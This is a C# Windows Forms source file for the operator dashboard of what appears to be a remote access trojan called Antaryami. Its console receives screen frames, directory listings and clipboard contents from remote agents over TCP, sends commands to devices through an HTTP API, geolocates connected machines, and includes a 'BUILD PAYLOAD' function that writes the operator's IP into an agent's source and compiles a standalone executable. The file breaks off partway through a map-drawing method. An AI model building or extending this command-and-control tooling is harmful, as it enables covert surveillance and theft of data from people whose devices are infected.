using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Text.Json;
using System.Runtime.InteropServices;
using System.Net.Http;

namespace AntaryamiSetuAdmin
{
    public class DashboardForm : Form
    {
        // ── P/Invoke: hook mouse & keyboard globally ──────────────────────────
        private delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")] private static extern bool ReleaseCapture();
        [DllImport("user32.dll")] private static extern IntPtr SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

        private const int WM_NCLBUTTONDOWN = 0xA1;
        private const int HT_CAPTION = 0x2;

        private const int WH_KEYBOARD_LL = 13;
        private const int WH_MOUSE_LL    = 14;

        private IntPtr _kbHook  = IntPtr.Zero;
        private IntPtr _mHook   = IntPtr.Zero;
        private LowLevelProc? _kbProc;
        private LowLevelProc? _mProc;

        // ── Auto-lock state ───────────────────────────────────────────────────
        private System.Windows.Forms.Timer _idleTimer  = new();
        private System.Windows.Forms.Timer _clockTimer = new();
        private DateTime _lastActivity = DateTime.Now;
        private const int IdleTimeoutMs  = 5 * 60 * 1000; // 5 minutes
        private bool _autoLockEnabled    = true;
        private bool _isLocked           = false;

        // ── Nav buttons we need to update ─────────────────────────────────────
        private Button? _btnLock;
        private Button? _btnAutoLock;
        private Label?  _lblClock;

        // ── Server / session ──────────────────────────────────────────────────
        private TcpListener? _server;
        private bool _isRunning = true;

        public static ConcurrentDictionary<string, ClientSession> Sessions = new();
        public static ConcurrentDictionary<string, DeviceInfo> KnownDevices = new();
        private static readonly string DevicesFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "devices_history.json");

        public static void LoadKnownDevices()
        {
            try
            {
                if (File.Exists(DevicesFilePath))
                {
                    string json = File.ReadAllText(DevicesFilePath);
                    var list = JsonSerializer.Deserialize<System.Collections.Generic.List<DeviceInfo>>(json);
                    if (list != null)
                    {
                        foreach (var d in list)
                        {
                            if (!string.IsNullOrEmpty(d.DeviceId) && d.DeviceId != "unknown")
                            {
                                KnownDevices[d.DeviceId] = d;
                            }
                        }
                    }
                }
            }
            catch {}
        }

        public static void SaveKnownDevices()
        {
            try
            {
                var list = new System.Collections.Generic.List<DeviceInfo>(KnownDevices.Values);
                string json = JsonSerializer.Serialize(list, new JsonSerializerOptions { WriteIndented = true });
                File.WriteAllText(DevicesFilePath, json);
            }
            catch {}
        }

        public static bool IsDeviceOnline(string deviceId, out ClientSession? activeSession)
        {
            activeSession = null;
            if (string.IsNullOrEmpty(deviceId) || deviceId == "unknown") return false;
            foreach (var session in Sessions.Values)
            {
                if (session.DeviceId == deviceId && session.IsActive)
                {
                    activeSession = session;
                    return true;
                }
            }
            return false;
        }
        
        public static readonly HttpClient _httpClient = new HttpClient();
        public static string ApiUrl = "https://yourdomain.com/api/api_setu.php";

        static DashboardForm()
        {
            _httpClient.DefaultRequestHeaders.Add("X-API-KEY", "SetuSecret@2026");
        }

        public static void SendHttpCommand(string deviceId, string command)
        {
            Task.Run(async () =>
            {
                try
                {
                    var content = new FormUrlEncodedContent(new[] {
                        new System.Collections.Generic.KeyValuePair<string, string>("action", "send_cmd"),
                        new System.Collections.Generic.KeyValuePair<string, string>("device_id", deviceId),
                        new System.Collections.Generic.KeyValuePair<string, string>("command", command)
                    });
                    await _httpClient.PostAsync(ApiUrl, content);
                }
                catch { }
            });
        }
        private System.Windows.Forms.Timer _httpTimer = new System.Windows.Forms.Timer();

        private readonly Color ColBg     = Color.FromArgb(5, 5, 5);
        private readonly Color ColPanel  = Color.FromArgb(20, 20, 20);
        private readonly Color ColGreen  = Color.FromArgb(0, 255, 64);
        private readonly Color ColCyan   = Color.FromArgb(0, 200, 255);
        private readonly Color ColRed    = Color.FromArgb(220, 30, 30);
        private readonly Color ColOrange = Color.FromArgb(255, 160, 30);
        private readonly Color ColGray   = Color.FromArgb(120, 120, 120);

        private Label? _lblStats;
        private Image? _bgImage;
        private Image? _worldMapImage;

        private Panel? _pnlRight;
        private Panel? _pnlMap;
        private Panel? _pnlTraffic;
        
        private BtopPanel? _btopPanel;
        
        // Traffic monitor state
        private long _bytesTransferredThisSecond = 0;
        private System.Collections.Generic.List<int> _trafficHistory = new();
        private System.Windows.Forms.Timer _trafficTimer = new();

        public DashboardForm()
        {
            LoadKnownDevices();
            InitializeGUI();
            StartServerBackground();
            InitIdleTracking();
            
            // Pre-fill traffic history with zeros
            for (int i = 0; i < 40; i++) _trafficHistory.Add(0);
            
            _trafficTimer.Interval = 1000;
            _trafficTimer.Tick += (s, e) => {
                lock (_trafficHistory)
                {
                    _trafficHistory.RemoveAt(0);
                    _trafficHistory.Add((int)(System.Threading.Interlocked.Read(ref _bytesTransferredThisSecond) / 1024)); // Store as KB/s
                    System.Threading.Interlocked.Exchange(ref _bytesTransferredThisSecond, 0);
                }
                _pnlTraffic?.Invalidate();
                _pnlMap?.Invalidate();
            };
            _trafficTimer.Start();

            _httpTimer.Interval = 5000;
            _httpTimer.Tick += async (s, e) => await FetchHttpDevicesAsync();
            _httpTimer.Start();
        }

        private async Task FetchHttpDevicesAsync()
        {
            if (!_isRunning) return;
            try
            {
                string json = await _httpClient.GetStringAsync($"{ApiUrl}?action=get_devices");
                using JsonDocument doc = JsonDocument.Parse(json);
                foreach (var element in doc.RootElement.EnumerateArray())
                {
                    string id = element.GetProperty("device_id").GetString() ?? "";
                    string name = element.GetProperty("device_name").GetString() ?? "Unknown";
                    string os = element.GetProperty("os_info").GetString() ?? "Unknown";
                    string path = element.GetProperty("current_path").GetString() ?? "Unknown";
                    int isOnline = element.GetProperty("is_online").GetInt32();

                    string epStr = "HTTP_" + id;

                    if (isOnline == 1)
                    {
                        if (!Sessions.ContainsKey(epStr))
                        {
                            var session = new ClientSession 
                            { 
                                IsHttp = true, 
                                DeviceId = id, 
                                DeviceName = name, 
                                OSInfo = os, 
                                CurrentPath = path, 
                                EndPoint = epStr 
                            };
                            Sessions[epStr] = session;
                            _ = Task.Run(() => ResolveGeoIPAsync(session));
                        }
                        else
                        {
                            var s = Sessions[epStr];
                            s.DeviceName = name;
                            s.OSInfo = os;
                            s.CurrentPath = path;
                        }

                        if (!string.IsNullOrEmpty(id) && id != "unknown")
                        {
                            var info = new DeviceInfo
                            {
                                DeviceId = id,
                                DeviceName = name,
                                OSInfo = os,
                                IsHttp = true,
                                LastIp = "HTTP API",
                                LastSeen = DateTime.Now
                            };
                            KnownDevices[id] = info;
                            SaveKnownDevices();
                        }
                    }
                    else
                    {
                        Sessions.TryRemove(epStr, out _);
                    }
                }
                Invoke(new Action(UpdateNodeUI));
            }
            catch { }
        }

        // ════════════════════════════════════════════════════════════════════════
        //  GUI
        // ════════════════════════════════════════════════════════════════════════
        private void InitializeGUI()
        {
            this.Text = "ANTARYAMI - DASHBOARD";
            this.Size = new Size(1200, 800);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.None; // Borderless
            this.WindowState = FormWindowState.Normal;
            this.BackColor = Color.FromArgb(15, 15, 15);
            this.ForeColor = ColGreen;
            this.Font = new Font("Segoe UI", 10F);
            this.DoubleBuffered = true;

            try {
                var assembly = System.Reflection.Assembly.GetExecutingAssembly();
                using (var stream = assembly.GetManifestResourceStream("AntaryamiSetuAdmin.backround_bg.png") ?? assembly.GetManifestResourceStream("AntaryamiSetuAdmin.backround_bg.jpg"))
                {
                    if (stream != null) _bgImage = Image.FromStream(stream);
                }
                using (var stream = assembly.GetManifestResourceStream("AntaryamiSetuAdmin.world_map.png"))
                {
                    if (stream != null) _worldMapImage = Image.FromStream(stream);
                }
            } catch { }

            // ── Top Title Bar ────────────────────────────────────────────────
            Panel pnlTopBar = new Panel { Dock = DockStyle.Top, Height = 40, BackColor = Color.FromArgb(20, 20, 20) };
            
            Label lblAppIcon = new Label { Text = "⚡", Font = new Font("Segoe UI", 12F, FontStyle.Bold), ForeColor = ColCyan, Location = new Point(10, 8), AutoSize = true };
            Label lblTitle = new Label { Text = "ANTARYAMI COMMAND CENTER", Font = new Font("Segoe UI", 10F, FontStyle.Bold), ForeColor = Color.WhiteSmoke, Location = new Point(35, 10), AutoSize = true };
            
            _lblStats = new Label { Text = "NODES: 0  |  ACTIVE: 0  |  SIGNAL: ENCRYPTED", Font = new Font("Segoe UI", 9F, FontStyle.Bold), ForeColor = ColGreen, AutoSize = true, Location = new Point(300, 11) };
            _lblClock = new Label { Text = "", Font = new Font("Consolas", 10F), ForeColor = ColGray, AutoSize = true, Location = new Point(650, 11) };

            Button btnClose = new Button { Text = "✕", BackColor = Color.Transparent, ForeColor = Color.WhiteSmoke, FlatStyle = FlatStyle.Flat, Size = new Size(40, 40), Dock = DockStyle.Right, Cursor = Cursors.Hand, Font = new Font("Segoe UI", 10F, FontStyle.Bold) };
            btnClose.FlatAppearance.BorderSize = 0;
            btnClose.Click += (s, e) => this.Close();
            btnClose.MouseEnter += (s, e) => btnClose.BackColor = ColRed;
            btnClose.MouseLeave += (s, e) => btnClose.BackColor = Color.Transparent;

            Button btnMax = new Button { Text = "🗖", BackColor = Color.Transparent, ForeColor = Color.WhiteSmoke, FlatStyle = FlatStyle.Flat, Size = new Size(40, 40), Dock = DockStyle.Right, Cursor = Cursors.Hand, Font = new Font("Segoe UI", 10F, FontStyle.Bold) };
            btnMax.FlatAppearance.BorderSize = 0;
            btnMax.Click += (s, e) => { this.WindowState = this.WindowState == FormWindowState.Maximized ? FormWindowState.Normal : FormWindowState.Maximized; };
            btnMax.MouseEnter += (s, e) => btnMax.BackColor = Color.FromArgb(40, 40, 40);
            btnMax.MouseLeave += (s, e) => btnMax.BackColor = Color.Transparent;

            Button btnMin = new Button { Text = "🗕", BackColor = Color.Transparent, ForeColor = Color.WhiteSmoke, FlatStyle = FlatStyle.Flat, Size = new Size(40, 40), Dock = DockStyle.Right, Cursor = Cursors.Hand, Font = new Font("Segoe UI", 10F, FontStyle.Bold) };
            btnMin.FlatAppearance.BorderSize = 0;
            btnMin.Click += (s, e) => { this.WindowState = FormWindowState.Minimized; };
            btnMin.MouseEnter += (s, e) => btnMin.BackColor = Color.FromArgb(40, 40, 40);
            btnMin.MouseLeave += (s, e) => btnMin.BackColor = Color.Transparent;

            pnlTopBar.Controls.Add(lblAppIcon);
            pnlTopBar.Controls.Add(lblTitle);
            pnlTopBar.Controls.Add(_lblStats);
            pnlTopBar.Controls.Add(_lblClock);
            pnlTopBar.Controls.Add(btnMin);
            pnlTopBar.Controls.Add(btnMax);
            pnlTopBar.Controls.Add(btnClose);
            MakeDraggable(pnlTopBar);
            MakeDraggable(lblTitle);
            MakeDraggable(_lblStats);
            MakeDraggable(_lblClock);

            // ── Left Sidebar ────────────────────────────────────────────────
            Panel pnlSidebar = new Panel { Dock = DockStyle.Left, Width = 250, BackColor = Color.FromArgb(10, 10, 10), Padding = new Padding(10) };
            
            Label lblLogo = new Label { Text = "A N T A R Y A M I", Font = new Font("Segoe UI", 18F, FontStyle.Bold), ForeColor = ColGreen, Dock = DockStyle.Top, Height = 60, TextAlign = ContentAlignment.MiddleCenter };
            Label lblSubTitle = new Label { Text = "[ OMNIVISION NETWORK ]", Font = new Font("Segoe UI", 9F, FontStyle.Regular), ForeColor = ColCyan, Dock = DockStyle.Top, Height = 30, TextAlign = ContentAlignment.TopCenter };
            
            pnlSidebar.Controls.Add(lblSubTitle);
            pnlSidebar.Controls.Add(lblLogo);

            Panel pnlNavButtons = new Panel { Dock = DockStyle.Fill, Padding = new Padding(0, 30, 0, 0) };
            
            Button btnBuild = MakeNavBtn("⚙ BUILD PAYLOAD", ColCyan);
            btnBuild.Click += BtnBuild_Click;
            btnBuild.Dock = DockStyle.Top;
            
            Panel pnlSpacer1 = new Panel { Height = 10, Dock = DockStyle.Top };
            
            Button btnDevices = MakeNavBtn("📡 VIEW DEVICES", ColGreen);
            btnDevices.Click += (s, e) =>
            {
                DevicesForm devForm = new DevicesForm();
                devForm.Icon = this.Icon;
                devForm.Show();
            };
            btnDevices.Dock = DockStyle.Top;
            
            Panel pnlSpacer2 = new Panel { Height = 10, Dock = DockStyle.Top };
            
            _btnAutoLock = MakeNavBtn("⏱ AUTO-LOCK: ON", ColOrange);
            _btnAutoLock.Click += (s, e) =>
            {
                _autoLockEnabled = !_autoLockEnabled;
                _lastActivity = DateTime.Now;
                UpdateAutoLockBtn();
            };
            _btnAutoLock.Dock = DockStyle.Top;
            
            _btnLock = MakeNavBtn("🔒 LOCK DASHBOARD", ColCyan);
            _btnLock.Click += (s, e) => LockDashboard();
            _btnLock.Dock = DockStyle.Bottom;
            
            Panel pnlSpacer3 = new Panel { Height = 10, Dock = DockStyle.Bottom };
            
            Button btnLogout = MakeNavBtn("⏻ LOGOUT", ColRed);
            btnLogout.Click += (s, e) => this.Close();
            btnLogout.Dock = DockStyle.Bottom;
            
            pnlNavButtons.Controls.Add(_btnAutoLock);
            pnlNavButtons.Controls.Add(pnlSpacer2);
            pnlNavButtons.Controls.Add(btnDevices);
            pnlNavButtons.Controls.Add(pnlSpacer1);
            pnlNavButtons.Controls.Add(btnBuild);
            
            pnlNavButtons.Controls.Add(_btnLock);
            pnlNavButtons.Controls.Add(pnlSpacer3);
            pnlNavButtons.Controls.Add(btnLogout);

            pnlSidebar.Controls.Add(pnlNavButtons);

            // ── Main Content Area ───────────────────────────────────────────
            Panel pnlMain = new Panel { Dock = DockStyle.Fill, BackColor = Color.Transparent, Padding = new Padding(15) };
            if (_bgImage != null)
            {
                pnlMain.BackgroundImage = _bgImage;
                pnlMain.BackgroundImageLayout = ImageLayout.Stretch;
            }

            _btopPanel = new BtopPanel { Dock = DockStyle.Fill, Padding = new Padding(0) };
            pnlMain.Controls.Add(_btopPanel);

            this.Controls.Add(pnlMain);
            this.Controls.Add(pnlSidebar);
            this.Controls.Add(pnlTopBar);
        }

        private Button MakeNavBtn(string text, Color fore)
        {
            var btn = new Button
            {
                Text = text, BackColor = Color.FromArgb(20, 20, 20), ForeColor = fore,
                FlatStyle = FlatStyle.Flat, Height = 50, Cursor = Cursors.Hand,
                Font = new Font("Segoe UI", 10F, FontStyle.Bold),
                TextAlign = ContentAlignment.MiddleLeft,
                Padding = new Padding(15, 0, 0, 0)
            };
            btn.FlatAppearance.BorderSize = 0;
            btn.FlatAppearance.MouseOverBackColor = Color.FromArgb(35, 35, 35);
            btn.FlatAppearance.MouseDownBackColor = Color.FromArgb(15, 15, 15);
            return btn;
        }

        private void MakeDraggable(Control control)
        {
            control.MouseDown += (s, e) =>
            {
                if (e.Button == MouseButtons.Left)
                {
                    if (this.WindowState == FormWindowState.Maximized)
                    {
                        this.WindowState = FormWindowState.Normal;
                        this.Size = new Size(1100, 750);
                        this.StartPosition = FormStartPosition.CenterScreen;
                    }
                    ReleaseCapture();
                    SendMessage(this.Handle, WM_NCLBUTTONDOWN, (IntPtr)HT_CAPTION, IntPtr.Zero);
                }
            };

            control.DoubleClick += (s, e) =>
            {
                if (this.WindowState == FormWindowState.Maximized)
                {
                    this.WindowState = FormWindowState.Normal;
                    this.Size = new Size(1100, 750);
                }
                else
                {
                    this.WindowState = FormWindowState.Maximized;
                }
            };
        }



        // ════════════════════════════════════════════════════════════════════════
        //  IDLE / AUTO-LOCK TRACKING
        // ════════════════════════════════════════════════════════════════════════
        private void InitIdleTracking()
        {
            // Global hooks to detect any keyboard or mouse activity
            _kbProc = KbHookCallback;
            _mProc  = MsHookCallback;

            using var curProcess = Process.GetCurrentProcess();
            using var curModule  = curProcess.MainModule!;
            IntPtr hMod = GetModuleHandle(curModule.ModuleName!);

            _kbHook = SetWindowsHookEx(WH_KEYBOARD_LL, _kbProc, hMod, 0);
            _mHook  = SetWindowsHookEx(WH_MOUSE_LL,    _mProc,  hMod, 0);

            // Idle check: fires every 10 seconds
            _idleTimer.Interval = 10_000;
            _idleTimer.Tick += (s, e) =>
            {
                if (!_autoLockEnabled || _isLocked) return;
                if ((DateTime.Now - _lastActivity).TotalMilliseconds >= IdleTimeoutMs)
                    LockDashboard();
            };
            _idleTimer.Start();

            // Live clock: fires every second
            _clockTimer.Interval = 1000;
            _clockTimer.Tick += (s, e) =>
            {
                if (_lblClock == null) return;
                var elapsed = DateTime.Now - _lastActivity;
                string idleStr = _autoLockEnabled
                    ? $"  |  IDLE: {(int)elapsed.TotalMinutes:D2}:{elapsed.Seconds:D2}"
                    : "  |  AUTO-LOCK: OFF";
                _lblClock.Text = DateTime.Now.ToString("HH:mm:ss") + idleStr;
            };
            _clockTimer.Start();
        }

        private IntPtr KbHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0) _lastActivity = DateTime.Now;
            return CallNextHookEx(_kbHook, nCode, wParam, lParam);
        }

        private IntPtr MsHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0) _lastActivity = DateTime.Now;
            return CallNextHookEx(_mHook, nCode, wParam, lParam);
        }

        // ── Lock / unlock ──────────────────────────────────────────────────────
        private void LockDashboard()
        {
            if (_isLocked) return;
            _isLocked = true;

            this.Invoke(new Action(() =>
            {
                this.Hide();

                var login = new LoginForm();
                var result = login.ShowDialog();

                if (result == DialogResult.OK && login.IsAuthenticated)
                {
                    // Correct password → unlock
                    _isLocked = false;
                    _lastActivity = DateTime.Now;
                    this.Show();
                    this.BringToFront();
                }
                else
                {
                    // Wrong password or closed → logout entirely
                    _isRunning = false;
                    this.Close();
                }
            }));
        }

        private void UpdateAutoLockBtn()
        {
            if (_btnAutoLock == null) return;
            if (_autoLockEnabled)
            {
                _btnAutoLock.Text = "⏱ AUTO-LOCK: ON";
                _btnAutoLock.ForeColor = ColOrange;
                _btnAutoLock.FlatAppearance.BorderColor = ColOrange;
            }
            else
            {
                _btnAutoLock.Text = "⏱ AUTO-LOCK: OFF";
                _btnAutoLock.ForeColor = ColGray;
                _btnAutoLock.FlatAppearance.BorderColor = ColGray;
            }
        }

        // ════════════════════════════════════════════════════════════════════════
        //  BUILD
        // ════════════════════════════════════════════════════════════════════════
        private async void BtnBuild_Click(object? sender, EventArgs e)
        {
            try
            {
                string localIp = GetLocalIPAddress();
                string targetDir = @"C:\Users\user\Desktop\ANTARYAMI-SETU\OfflineAgent";
                
                if (!File.Exists(Path.Combine(targetDir, "Program.cs")))
                {
                    string searchDir = Path.GetDirectoryName(Application.ExecutablePath) ?? "";
                    while (!string.IsNullOrEmpty(searchDir))
                    {
                        if (File.Exists(Path.Combine(searchDir, "OfflineAgent", "AntaryamiSetuAgent.csproj")))
                        {
                            targetDir = Path.Combine(searchDir, "OfflineAgent");
                            break;
                        }
                        searchDir = Path.GetDirectoryName(searchDir) ?? "";
                    }
                }

                string programCs = Path.Combine(targetDir, "Program.cs");
                if (!File.Exists(programCs))
                {
                    MessageBox.Show("Could not locate payload source code (Program.cs). Please keep the admin app in the project folder.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                string code = File.ReadAllText(programCs);
                code = Regex.Replace(code, @"ServerIp\s*=\s*"".*?"";", $@"ServerIp = ""{localIp}"";");
                File.WriteAllText(programCs, code);

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "dotnet",
                    Arguments = "publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:IncludeNativeLibrariesForSelfExtract=true",
                    WorkingDirectory = targetDir,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using Process? p = Process.Start(psi);
                if (p != null)
                {
                    await p.WaitForExitAsync();
                    if (p.ExitCode == 0) MessageBox.Show("Payload Compiled!\nPath: " + targetDir + @"\bin\Release\net10.0-windows\win-x64\publish\AntaryamiSetuAgent.exe", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    else MessageBox.Show("Build Failed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            catch (Exception ex) { MessageBox.Show("Build Error: " + ex.Message); }
        }

        private string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
                if (ip.AddressFamily == AddressFamily.InterNetwork) return ip.ToString();
            return "127.0.0.1";
        }

        // ════════════════════════════════════════════════════════════════════════
        //  SERVER / SESSIONS
        // ════════════════════════════════════════════════════════════════════════
        private void StartServerBackground()
        {
            try
            {
                _server = new TcpListener(IPAddress.Any, 9999);
                _server.Start();
                Task.Run(() => AcceptConnectionsAsync());
            }
            catch { }
        }

        private async Task AcceptConnectionsAsync()
        {
            while (_isRunning)
            {
                try
                {
                    TcpClient client = await _server!.AcceptTcpClientAsync();
                    IPEndPoint? remoteEp = client.Client.RemoteEndPoint as IPEndPoint;
                    string epStr = remoteEp != null ? $"{remoteEp.Address}:{remoteEp.Port}" : Guid.NewGuid().ToString();

                    var session = new ClientSession { Client = client, Stream = client.GetStream(), EndPoint = epStr };
                    Sessions[epStr] = session;
                    _ = Task.Run(() => ResolveGeoIPAsync(session));

                    _ = Task.Run(() => Console.Beep(1200, 150));
                    _ = Task.Run(() => ReceivePacketsAsync(session));
                }
                catch { if (!_isRunning) break; }
            }
        }

        private async Task ReceivePacketsAsync(ClientSession session)
        {
            byte[] headerBuffer = new byte[5];
            while (_isRunning && session.IsActive)
            {
                try
                {
                    int bytesRead = 0;
                    while (bytesRead < 5)
                    {
                        int read = await session.Stream.ReadAsync(headerBuffer, bytesRead, 5 - bytesRead);
                        if (read == 0) throw new IOException("Disconnected.");
                        bytesRead += read;
                        System.Threading.Interlocked.Add(ref _bytesTransferredThisSecond, read);
                    }
                    byte type = headerBuffer[0];
                    int length = BitConverter.ToInt32(headerBuffer, 1);
                    byte[] payload = new byte[length];
                    int payloadRead = 0;
                    while (payloadRead < length)
                    {
                        int read = await session.Stream.ReadAsync(payload, payloadRead, length - payloadRead);
                        if (read == 0) throw new IOException("Disconnected during payload.");
                        payloadRead += read;
                        System.Threading.Interlocked.Add(ref _bytesTransferredThisSecond, read);
                    }

                    payload = EncryptionUtil.Decrypt(payload);
                    if (payload.Length == 0) throw new IOException("Decryption failed or empty payload.");

                    if (type == 1) // Telemetry
                    {
                        using var doc = JsonDocument.Parse(Encoding.UTF8.GetString(payload));
                        var r = doc.RootElement;
                        session.DeviceId   = r.GetProperty("device_id").GetString()    ?? "unknown";
                        session.DeviceName = r.GetProperty("device_name").GetString()  ?? "Unknown";
                        session.OSInfo     = r.GetProperty("os_info").GetString()      ?? "Unknown";
                        session.CurrentPath = r.GetProperty("current_path").GetString() ?? "Unknown";

                        if (session.DeviceId != "unknown")
                        {
                            var info = new DeviceInfo
                            {
                                DeviceId = session.DeviceId,
                                DeviceName = session.DeviceName,
                                OSInfo = session.OSInfo,
                                IsHttp = false,
                                LastIp = session.EndPoint,
                                LastSeen = DateTime.Now
                            };
                            KnownDevices[session.DeviceId] = info;
                            SaveKnownDevices();
                        }

                        Invoke(new Action(UpdateNodeUI));
                    }
                    else if (type == 8) // Screen Frame
                    {
                        if (session.OnScreenFrameReceived != null)
                        {
                            session.OnScreenFrameReceived.Invoke(payload);
                        }
                    }
                    else if (type == 9) // Directory List JSON
                    {
                        if (session.OnDirectoryListReceived != null)
                        {
                            session.OnDirectoryListReceived.Invoke(payload);
                        }
                    }
                    else if (type == 10) // Clipboard Data
                    {
                        if (session.OnClipboardReceived != null)
                        {
                            session.OnClipboardReceived.Invoke(Encoding.UTF8.GetString(payload));
                        }
                    }
                    else if (session.OnPacketReceived != null)
                    {
                        session.OnPacketReceived.Invoke(type, payload);
                    }
                }
                catch
                {
                    session.IsActive = false;
                    Invoke(new Action(() => {
                        Sessions.TryRemove(session.EndPoint, out _);
                        UpdateNodeUI();
                    }));
                    if (session.OnDisconnected != null) session.OnDisconnected.Invoke();
                    break;
                }
            }
        }

        private void UpdateNodeUI()
        {
            if (InvokeRequired) { Invoke(new Action(UpdateNodeUI)); return; }

            if (_lblStats != null)
            {
                int total = KnownDevices.Count;
                int online = 0;
                int offline = 0;
                foreach (var device in KnownDevices.Values)
                {
                    if (IsDeviceOnline(device.DeviceId, out _))
                        online++;
                    else
                        offline++;
                }
                _lblStats.Text = $"NODES: {total}  |  ACTIVE: {online}  |  OFFLINE: {offline}  |  SIGNAL: ENCRYPTED";
            }
        }

        // ════════════════════════════════════════════════════════════════════════
        //  CLEANUP
        // ════════════════════════════════════════════════════════════════════════
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            _btopPanel?.StopTimer();
            _idleTimer.Stop();
            _clockTimer.Stop();
            _httpTimer.Stop();
            _trafficTimer.Stop();
            if (_kbHook != IntPtr.Zero) UnhookWindowsHookEx(_kbHook);
            if (_mHook  != IntPtr.Zero) UnhookWindowsHookEx(_mHook);

            _isRunning = false;
            try { _server?.Stop(); } catch { }
            foreach (var s in Sessions.Values) { try { s.Client.Close(); } catch { } }
            base.OnFormClosing(e);
        }

        private void PnlTraffic_Paint(object? sender, PaintEventArgs e)
        {
            Graphics g = e.Graphics;
            g.SmoothingMode = SmoothingMode.AntiAlias;

            Rectangle rect = _pnlTraffic!.ClientRectangle;
            
            // Draw glassmorphic border
            using (Pen borderPen = new Pen(Color.FromArgb(40, ColCyan), 1))
            {
                g.DrawRectangle(borderPen, 0, 0, rect.Width - 1, rect.Height - 1);
            }
            
            // Draw background grid lines
            using (Pen gridPen = new Pen(Color.FromArgb(10, ColCyan), 1))
            {
                for (int x = 40; x < rect.Width; x += 40)
                    g.DrawLine(gridPen, x, 0, x, rect.Height);
                for (int y = 30; y < rect.Height; y += 30)
                    g.DrawLine(gridPen, 0, y, rect.Width, y);
            }

            // Draw real-time scrolling wave area graph
            lock (_trafficHistory)
            {
                if (_trafficHistory.Count < 2) return;
                
                int maxVal = _trafficHistory.Max();
                if (maxVal < 10) maxVal = 10; // Default scale limit

                PointF[] points = new PointF[_trafficHistory.Count];
                PointF[] fillPoints = new PointF[_trafficHistory.Count + 2];

                for (int i = 0; i < _trafficHistory.Count; i++)
                {
                    float x = (float)i / (_trafficHistory.Count - 1) * (rect.Width - 20) + 10;
                    float y = rect.Height - 20 - ((float)_trafficHistory[i] / maxVal * (rect.Height - 40));
                    points[i] = new PointF(x, y);
                    fillPoints[i] = new PointF(x, y);
                }

                fillPoints[_trafficHistory.Count] = new PointF(points[points.Length - 1].X, rect.Height - 10);
                fillPoints[_trafficHistory.Count + 1] = new PointF(points[0].X, rect.Height - 10);

                using (var fillBrush = new System.Drawing.Drawing2D.LinearGradientBrush(
                    new Point(0, 0), new Point(0, rect.Height),
                    Color.FromArgb(60, ColCyan), Color.FromArgb(0, ColCyan)))
                {
                    g.FillPolygon(fillBrush, fillPoints);
                }

                using (Pen curvePen = new Pen(ColCyan, 2))
                {
                    g.DrawCurve(curvePen, points);
                }
                
                using (Font speedFont = new Font("Consolas", 10F, FontStyle.Bold))
                using (SolidBrush textBrush = new SolidBrush(Color.White))
                {
                    int currentSpeed = _trafficHistory[_trafficHistory.Count - 1];
                    g.DrawString($"LIVE: {currentSpeed} KB/s", speedFont, textBrush, 15, 15);
                    g.DrawString($"PEAK: {maxVal} KB/s", speedFont, textBrush, rect.Width - 140, 15);
                }
            }
        }
        private void PnlMap_Paint(object? sender, PaintEventArgs e)
        {
            Graphics g = e.Graphics;
            g.SmoothingMode = SmoothingMode.AntiAlias;

            Rectangle rect = _pnlMap!.ClientRectangle;
            
            // Draw glassmorphic border
            using (Pen borderPen = new Pen(Color.FromArgb(40, ColCyan), 1))
            {
                g.DrawRectangle(borderPen, 0, 0, rect.Width - 1, rect.Height - 1);
            }

            // Draw a high-tech scanning grid background
            using (Pen gridPen = new Pen(Color.FromArgb(8, ColCyan), 1))
            {
                for (int x = 20; x < rect.Width; x += 20)
                    g.DrawLine(gridPen, x, 0, x, rect.Height);
                for (int y = 20; y < rect.Height; y += 20)
                    g.DrawLine(gridPen, 0, y, rect.Width, y);
            }

            // Relative continental coordinates scaled to 100x100 grid
            PointF[] northAmerica = {
                new PointF(5, 12), new PointF(25, 10), new PointF(38, 20), new PointF(32, 42),
                new PointF(25, 45), new PointF(18, 32), new PointF(10, 25)
            };
            PointF[] southAmerica = {
                new PointF(25, 45), new PointF(34, 48), new PointF(32, 65), new PointF(26, 85),
                new PointF(22, 75), new PointF(23, 58)
            };
            PointF[] eurasia = {
                new PointF(38, 12), new PointF(75, 8), new PointF(92, 15), new PointF(95, 38),
                new PointF(85, 45), new PointF(70, 48), new PointF(52, 38), new PointF(42, 32)
            };
            PointF[] africa = {
                new PointF(42, 38), new PointF(58, 38), new PointF(62, 52), new PointF(54, 72),
                new PointF(48, 70), new PointF(44, 50)
            };
            PointF[] australia = {
                new PointF(82, 60), new PointF(92, 62), new PointF(90, 75), new PointF(80, 72)
            };
            PointF[][] continents = { northAmerica, southAmerica, eurasia, africa, australia };

            PointF[] ScalePolygon(PointF[] poly)
            {
                PointF[] scaled = new PointF[poly.Length];
                for (int i = 0; i < poly.Length; i++)
                {
                    scaled[i] = new PointF(
                        poly[i].X / 100f * (rect.Width - 20) + 10,
                        poly[i].Y / 100f * (rect.Height - 20) + 10
                    );
                }
                return scaled;
            }

            if (_worldMapImage != null)
            {
